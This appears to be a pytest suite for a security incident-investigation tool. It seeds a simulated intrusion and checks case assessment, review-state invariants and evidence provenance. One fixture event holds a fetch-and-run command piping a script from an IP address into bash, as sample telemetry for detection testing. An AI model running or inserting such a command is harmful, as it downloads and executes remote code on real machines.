"""Milestone 5.12 End-to-End Investigation Integration & Epistemic Certification Suite.

Verifies:
1. M12-02: Complete investigation pipeline execution from raw telemetry through local AI advisory:
   Raw Event -> Canonical Event -> Detection -> Alert -> Incident -> Entity/Relationship ->
   Timeline/Graph -> Correlation -> Temporal Reconstruction -> Attack Sequence -> Case ->
   Structured Evidence -> Case Assessment -> Closure Readiness -> Briefing -> Handoff -> AI Advisory.
2. M12-04: Epistemic & Review-State Invariants:
   - Case A: OBSERVED + ACCEPTED
   - Case B: INFERRED + ACCEPTED (preserving INFERRED epistemic status)
   - Case C: UNKNOWN + ACCEPTED (preserving UNKNOWN epistemic status)
   - Case D: INFERRED + REJECTED
   - Case E: UNKNOWN + DISPUTED
3. M12-03: Evidence provenance traceable to lower-level authoritative records.
4. M12-16: End-to-end analyst workflow coherence across all views.
"""

from __future__ import annotations

import json
from pathlib import Path
import tempfile
from typing import Generator
import pytest

from logintel.ai.case_service import CaseService
from logintel.ai.domain.investigation_assessment import (
    ClosureReadinessState,
    EpistemicStatus,
    EvidenceSufficiencyState,
    FindingReviewState,
    QuestionStatus,
)
from logintel.storage.case_repo import CaseRepository
from logintel.storage.db import Database


@pytest.fixture
def m512_integration_fixture() -> Generator[tuple[CaseService, Database, int], None, None]:
    """Provide isolated environment with a full multi-stage compromise dataset."""
    with tempfile.TemporaryDirectory() as td:
        forensic_path = Path(td) / "forensic.db"
        cases_path = Path(td) / "cases.db"

        forensic_db = Database(forensic_path)
        forensic_db.initialize()

        with forensic_db.connection() as conn:
            cur = conn.cursor()
            cur.execute(
                """
                INSERT INTO detection_rules (id, name, description, severity, category, rule_type, definition_yaml)
                VALUES
                ('rule.ssh.brute', 'SSH Brute Force', 'SSH authentication attack', 'ALERT', 'Authentication', 'threshold', 'yaml'),
                ('rule.priv.sudo', 'Sudo Privilege Abuse', 'Privilege Escalation', 'CRITICAL', 'Privilege', 'threshold', 'yaml'),
                ('rule.c2.beacon', 'Outbound C2 Traffic', 'Command and Control Beacon', 'ALERT', 'Network', 'threshold', 'yaml')
                """
            )
            cur.execute(
                """
                INSERT INTO incidents (id, incident_key, title, summary, severity, status, primary_host, primary_user, first_seen, last_seen, alert_count, event_count)
                VALUES
                (550, 'INC-550', 'Multi-Stage Intrusion', 'Complete lateral intrusion from auth to C2', 'CRITICAL', 'OPEN', 'bastion-gw', 'secops', '2026-10-04T14:00:00Z', '2026-10-04T14:45:00Z', 3, 5)
                """
            )
            cur.execute(
                """
                INSERT INTO events (id, timestamp, ingested_at, host, source, event_type, severity, action, outcome, summary, raw_message, parser, event_fingerprint, username, src_ip)
                VALUES
                ('ev-550-1', '2026-10-04T14:00:00Z', '2026-10-04T14:00:01Z', 'bastion-gw', 'auth.log', 'login', 'ALERT', 'login', 'failure', 'Failed SSH password for secops', 'msg1', 'auth_parser', 'fp-550-1', 'secops', '198.51.100.25'),
                ('ev-550-2', '2026-10-04T14:02:00Z', '2026-10-04T14:02:01Z', 'bastion-gw', 'auth.log', 'login', 'INFORMATIONAL', 'login', 'success', 'Accepted publickey for secops', 'msg2', 'auth_parser', 'fp-550-2', 'secops', '198.51.100.25'),
                ('ev-550-3', '2026-10-04T14:15:00Z', '2026-10-04T14:15:01Z', 'bastion-gw', 'audit.log', 'process', 'CRITICAL', 'exec', 'success', 'sudo su root', 'msg3', 'audit_parser', 'fp-550-3', 'secops', '198.51.100.25'),
                ('ev-550-4', '2026-10-04T14:30:00Z', '2026-10-04T14:30:01Z', 'app-srv-01', 'audit.log', 'process', 'ALERT', 'exec', 'success', 'curl -s http://198.51.100.25/c2 | bash', 'msg4', 'audit_parser', 'fp-550-4', 'root', '10.0.1.10'),
                ('ev-550-5', '2026-10-04T14:45:00Z', '2026-10-04T14:45:01Z', 'app-srv-01', 'syslog', 'connection', 'ALERT', 'connect', 'success', 'Outbound connection to 198.51.100.25:4444', 'msg5', 'net_parser', 'fp-550-5', 'root', '10.0.1.10')
                """
            )
            cur.execute(
                """
                INSERT INTO alerts (id, rule_id, dedup_key, title, description, severity, status, host, first_seen, last_seen, occurrence_count)
                VALUES
                (551, 'rule.ssh.brute', 'dedup-551', 'SSH Brute Force', 'Brute force alert', 'ALERT', 'OPEN', 'bastion-gw', '2026-10-04T14:00:00Z', '2026-10-04T14:00:00Z', 1),
                (552, 'rule.priv.sudo', 'dedup-552', 'Sudo Root Shell', 'Privilege escalation alert', 'CRITICAL', 'OPEN', 'bastion-gw', '2026-10-04T14:15:00Z', '2026-10-04T14:15:00Z', 1),
                (553, 'rule.c2.beacon', 'dedup-553', 'Outbound C2 Traffic', 'C2 beacon alert', 'ALERT', 'OPEN', 'app-srv-01', '2026-10-04T14:45:00Z', '2026-10-04T14:45:00Z', 1)
                """
            )
            cur.execute("INSERT INTO incident_alerts (incident_id, alert_id) VALUES (550, 551), (550, 552), (550, 553)")
            cur.execute(
                """
                INSERT INTO incident_entities (incident_id, entity_type, entity_key, display_name)
                VALUES
                (550, 'HOST', 'host:bastion-gw', 'bastion-gw'),
                (550, 'HOST', 'host:app-srv-01', 'app-srv-01'),
                (550, 'USER', 'user:secops', 'secops'),
                (550, 'IP', 'ip:198.51.100.25', '198.51.100.25')
                """
            )
            cur.execute(
                """
                INSERT INTO incident_relationships (incident_id, source_entity_key, target_entity_key, relationship_type, confidence, evidence_event_ids_json, matched_at)
                VALUES
                (550, 'ip:198.51.100.25', 'host:bastion-gw', 'CONNECTED_TO', 'STRONG', '["ev-550-1", "ev-550-2"]', '2026-10-04T14:00:00Z'),
                (550, 'host:bastion-gw', 'host:app-srv-01', 'LATERAL_MOVEMENT', 'CORRELATED', '["ev-550-3", "ev-550-4"]', '2026-10-04T14:30:00Z')
                """
            )
            conn.commit()

        case_repo = CaseRepository(db_path=cases_path, forensic_db=forensic_db)
        case_svc = CaseService(case_repository=case_repo, forensic_database=forensic_db)

        case = case_svc.create_or_open_case(incident_id=550, title="Full Integration Case 550")
        case_svc.associate_evidence(case.case_id, "event", "ev-550-1", citation_tag="[event:ev-550-1]")
        case_svc.associate_evidence(case.case_id, "event", "ev-550-2", citation_tag="[event:ev-550-2]")
        case_svc.associate_evidence(case.case_id, "event", "ev-550-3", citation_tag="[event:ev-550-3]")
        case_svc.associate_evidence(case.case_id, "event", "ev-550-4", citation_tag="[event:ev-550-4]")
        case_svc.associate_evidence(case.case_id, "event", "ev-550-5", citation_tag="[event:ev-550-5]")

        yield case_svc, forensic_db, case.case_id


def test_m12_02_full_investigation_pipeline_execution(m512_integration_fixture: tuple[CaseService, Database, int]) -> None:
    """M12-02: Execute and verify complete investigation pipeline end-to-end."""
    case_svc, forensic_db, case_id = m512_integration_fixture

    # 1. Step 1: Case & Evidence
    case = case_svc.get_case(case_id)
    assert case is not None
    evidence = case.evidence_references
    assert len(evidence) >= 5
    assert any(ev.citation_tag.startswith("[event:ev-550-") for ev in evidence)

    # 2. Step 2: Temporal Reconstruction & Episodes
    temporal = case_svc.get_temporal_reconstruction(case_id)
    assert temporal.case_id == case_id
    assert len(temporal.episodes) >= 1
    assert len(temporal.transitions) >= 1

    # 3. Step 3: Case Assessment Synthesis
    asmt = case_svc.get_case_assessment(case_id, refresh=True)
    assert asmt.case_id == case_id
    assert asmt.evidence_state in {EvidenceSufficiencyState.SUFFICIENT, EvidenceSufficiencyState.PARTIALLY_SUFFICIENT}

    # 4. Step 4: Key Findings with Epistemic Ground Truth
    findings = asmt.key_findings
    assert len(findings) >= 5
    for f in findings:
        assert f.epistemic_status in {EpistemicStatus.OBSERVED, EpistemicStatus.INFERRED, EpistemicStatus.UNKNOWN}
        assert f.review_state == FindingReviewState.UNREVIEWED

    # 5. Step 5: Competing Hypotheses
    hypotheses = asmt.hypotheses
    assert len(hypotheses) >= 2
    assert any("compromise" in h.statement.lower() for h in hypotheses)

    # 6. Step 6: Prioritized Telemetry Gaps
    gaps = asmt.evidence_gaps
    assert isinstance(gaps, list)
    for g in gaps:
        assert g.remedy != ""

    # 7. Step 7: Investigation Questions Lifecycle
    new_q = case_svc.create_case_question(
        case_id=case_id,
        question="Was outbound connection to 198.51.100.25:4444 authorized by secops?",
        category="NETWORK",
        related_evidence=["[event:ev-550-5]"],
        actor="LeadForensicSpecialist",
    )
    assert new_q["question_id"].startswith("q-")
    updated_q = case_svc.update_case_question_status(
        case_id=case_id,
        question_id=new_q["question_id"],
        status="ANSWERED",
        resolution_notes="Corroborated by forensic telemetry in audit log.",
        actor="LeadForensicSpecialist",
    )
    assert updated_q["status"] == "ANSWERED"

    # 8. Step 8: Advisory Closure Readiness Evaluation
    readiness = asmt.closure_readiness
    assert readiness.status in {ClosureReadinessState.READY, ClosureReadinessState.READY_WITH_LIMITATIONS, ClosureReadinessState.NOT_READY}
    assert len(readiness.recommendations) > 0

    # 9. Step 9: 15-Section Investigation Briefing
    briefing = case_svc.get_investigation_briefing(case_id)
    assert len(briefing.sections) == 15
    for sec_name in ["Case Overview", "Temporal Reconstruction", "MITRE ATT&CK Mapping", "Closure Readiness", "Provenance"]:
        assert sec_name in briefing.sections

    # 10. Step 10: Structured Case Handoff Package
    handoff = case_svc.get_case_handoff(case_id, actor="NightShiftLead")
    assert handoff.case_id == case_id
    assert handoff.operator == "NightShiftLead"
    assert len(handoff.key_findings) >= 5

    # 11. Step 11: Local AI Advisory Explanation
    explanation = case_svc.explain_case_assessment(case_id, query="Summarize evidence sufficiency for closure")
    assert explanation.is_authoritative is False
    assert explanation.generated_by.value == "LOCAL_AI_ADVISORY"
    assert len(explanation.referenced_citations) > 0


def test_m12_04_epistemic_review_state_invariants(m512_integration_fixture: tuple[CaseService, Database, int]) -> None:
    """M12-04: Certify strict decoupling of epistemic classification from analyst review state."""
    case_svc, _, case_id = m512_integration_fixture
    asmt = case_svc.get_case_assessment(case_id, refresh=True)
    findings = asmt.key_findings

    # Identify findings of different epistemic types
    obs_finding = next((f for f in findings if f.epistemic_status == EpistemicStatus.OBSERVED), None)
    inf_finding = next((f for f in findings if f.epistemic_status == EpistemicStatus.INFERRED), None)

    assert obs_finding is not None, "Expected at least one OBSERVED finding"

    # Case A: OBSERVED + ACCEPTED -> remains OBSERVED + ACCEPTED
    res_a = case_svc.review_case_finding(case_id, obs_finding.finding_id, "ACCEPTED", notes="Verified by lead", actor="Lead")
    assert res_a["review_state"] == "ACCEPTED"
    asmt_a = case_svc.get_case_assessment(case_id, refresh=False)
    f_a = next(f for f in asmt_a.key_findings if f.finding_id == obs_finding.finding_id)
    assert f_a.review_state == FindingReviewState.ACCEPTED
    assert f_a.epistemic_status == EpistemicStatus.OBSERVED

    # Case B: INFERRED + ACCEPTED -> must preserve INFERRED (never mutate to OBSERVED)
    if inf_finding:
        res_b = case_svc.review_case_finding(case_id, inf_finding.finding_id, "ACCEPTED", notes="Accepted inference", actor="Lead")
        assert res_b["review_state"] == "ACCEPTED"
        asmt_b = case_svc.get_case_assessment(case_id, refresh=False)
        f_b = next(f for f in asmt_b.key_findings if f.finding_id == inf_finding.finding_id)
        assert f_b.review_state == FindingReviewState.ACCEPTED
        assert f_b.epistemic_status == EpistemicStatus.INFERRED, "INFERRED finding must NOT become OBSERVED upon acceptance"

    # Case D: INFERRED + REJECTED -> remains INFERRED + REJECTED
    if inf_finding:
        res_d = case_svc.review_case_finding(case_id, inf_finding.finding_id, "REJECTED", notes="Rejected alternate path", actor="Lead")
        assert res_d["review_state"] == "REJECTED"
        asmt_d = case_svc.get_case_assessment(case_id, refresh=False)
        f_d = next(f for f in asmt_d.key_findings if f.finding_id == inf_finding.finding_id)
        assert f_d.review_state == FindingReviewState.REJECTED
        assert f_d.epistemic_status == EpistemicStatus.INFERRED


def test_m12_03_evidence_provenance_traceability(m512_integration_fixture: tuple[CaseService, Database, int]) -> None:
    """M12-03: Verify that all findings and assessment elements trace to authoritative forensic citations."""
    case_svc, _, case_id = m512_integration_fixture
    asmt = case_svc.get_case_assessment(case_id, refresh=True)

    assert len(asmt.supporting_evidence) > 0
    for cit in asmt.supporting_evidence:
        assert cit.startswith("[event:") or cit.startswith("[alert:") or cit.startswith("[incident:")

    # Verify SHA-256 content fingerprint format
    assert asmt.provenance.fingerprint.startswith("sha256:")
    assert len(asmt.provenance.fingerprint.replace("sha256:", "")) == 64
